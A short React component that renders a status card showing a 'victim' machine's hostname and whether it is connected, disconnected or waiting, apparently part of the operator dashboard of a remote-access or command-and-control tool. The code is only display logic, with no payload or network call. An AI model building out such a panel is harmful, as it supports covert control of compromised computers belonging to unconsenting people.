"use client";



import type { Victim } from "../../api/victims";

import { isVictimOnline } from "../utils/victim-status";

function getStatus(victim: Victim | null): "waiting" | "connected" | "disconnected" {
    if (!victim) return "waiting";

    const online = isVictimOnline(victim);
    return online ? "connected" : "disconnected";
}

export function DetailStatusCard(props: { victim: Victim | null }) {
    const { victim } = props;
    const status = getStatus(victim);

    const lineColor =
        status === "connected" ? "#4caf50" : status === "disconnected" ? "#f44336" : "#888";

    const pulseSpeed =
        status === "connected" ? "1.2s" : status === "disconnected" ? "0.9s" : "1.5s";

    const label = status === "connected" ? "Connected" : status === "disconnected" ? "Disconnected" : "Waiting for user";

    return (
        <div
            className={
                "mt-auto rounded-[14px] border border-[rgba(120,120,120,0.7)] bg-[rgba(32,32,36,0.9)] px-[8px] pb-[18px] pt-[12px] text-center " +
                "text-[15px] font-semibold text-[rgba(235,235,235,0.97)]"
            }
        >
            <div className="mb-[8px] text-[15px] font-semibold text-[rgba(235,235,235,0.95)]" id="detailStatusPc">
                {victim?.hostname ?? "-"}
            </div>
            <div className="mb-[8px] h-[2px] w-full bg-[var(--line)]" />
            <div className="mb-[4px] select-none" id="detailStatusLabel">
                {label}
            </div>
            <div
                className="mx-auto h-[3px] w-[85%] rounded-full"
                style={{
                    background: lineColor,
                    opacity: 0.85,
                    animation: `detailStatusPulse ${pulseSpeed} ease-in-out infinite`,
                }}
            />
            <style>{`
            @keyframes detailStatusPulse {
               0% { opacity: 0.25; }
               50% { opacity: 1; }
               100% { opacity: 0.25; }
            }
         `}</style>
        </div>
    );
}
